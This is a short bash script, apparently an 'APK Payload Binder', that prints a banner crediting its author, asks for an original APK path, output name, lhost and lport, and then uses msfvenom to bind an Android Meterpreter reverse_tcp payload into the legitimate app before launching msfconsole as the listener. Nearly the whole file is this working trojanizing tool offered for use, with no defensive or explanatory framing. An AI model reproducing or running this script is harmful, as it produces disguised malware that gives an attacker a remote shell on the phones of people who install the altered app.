clear


#text colors

red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
blue=$(tput setaf 4)
pink=$(tput setaf 5)
cyan=$(tput setaf 6)
white=$(tput setaf 7)

#Banner Started

echo "${red} 	+-+-+-+-+-+-+-+-+-+-+-+-+ "
echo "${red} 	A|P|K| - |B|I|N|D|E|R| "
echo "${red} 	+-+-+-+-+-+-+-+-+-+-+-+-+ "
echo "${yellow}${bt}"
echo "          ╔═════•|✿|•═════╗"
echo "             Mahnudul Islam  "
echo "          ╚═════•|✿|•═════╝"
echo "${reset}"
echo "${bt}"
echo "${cyan} ~ Script Is Made By Mahmudul Islam"
echo "${cyan} ~ Facebook ID: Mahmudul Islam"
echo
echo "${white}${bt} • APK Payload Binder ${reset}"
echo
echo "${red}${bt} • This Script Will Only Work If You've"
echo "   Metasploit Installed  ${reset}"
echo

#Bind Payload
read -p "[*]Enter Original APK Path#~: " path
read -p "[*]Enter Output APK Name#~: " payload
read -p "[*]Enter lhost#~: " lhost
read -p "[*]Enter lport#~: " lport
echo -e "\e[31m[*]Payload Binder Started..;p\e[0m"
msfvenom -x $path -a dalvik --platform android -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> $payload.apk

#Msfconsole listner start
echo -e "\e[34m                                                \e[2m";
read -p "[-]Start msfconsole listner(Enter) or Close (Ctrl+c) : " listner
msfconsole